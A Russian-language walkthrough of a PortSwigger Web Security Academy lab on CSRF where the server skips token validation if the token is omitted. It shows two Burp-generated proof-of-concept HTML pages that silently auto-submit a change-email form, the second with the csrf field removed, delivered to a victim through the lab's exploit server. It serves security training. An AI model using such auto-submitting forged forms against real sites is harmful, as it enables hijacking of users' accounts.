залогинимся под `wiener:peter`

и изменим почту на `test@test.com`
и найдем в `Proxy` -> `HTTP history` этот запрос
```
POST /my-account/change-email
...
email=test%40test.com&csrf=wt84kxYQR5mLEUWXi7iJBKn45WJ36mCC
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/3.%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/pics%20for%20walkthrough/1.png)
Некоторые приложения правильно проверяют маркер, когда он присутствует, но пропускают проверку, если маркер опущен.

В этой ситуации злоумышленник может удалить весь параметр, содержащий токен (а не только его значение) , соответсвенно, чтобы обойти проверку попросту удалим данный токен из запроса


Далее нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
получим следующий запрос 
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af600d103bceadb80d5ee87002b00f8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="wt84kxYQR5mLEUWXi7iJBKn45WJ36mCC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Так как в данной лабораторной работе проверяем что сервер съест запрос и без CSRF токена уберем строку 
```
<input type="hidden" name="csrf" value="wt84kxYQR5mLEUWXi7iJBKn45WJ36mCC" />
```
а так же заменим почту, чтобы у жертвы адрес сменился на `test2@test.com`
и в итоге получим следующий PoC

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af600d103bceadb80d5ee87002b00f8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Перейдем в `Exploit server`
и введем туда нами сконфигурированный PoC
Нажмем `Store`, далее `Deliver exploit to victim`
и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/3.%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/pics%20for%20walkthrough/2.png)
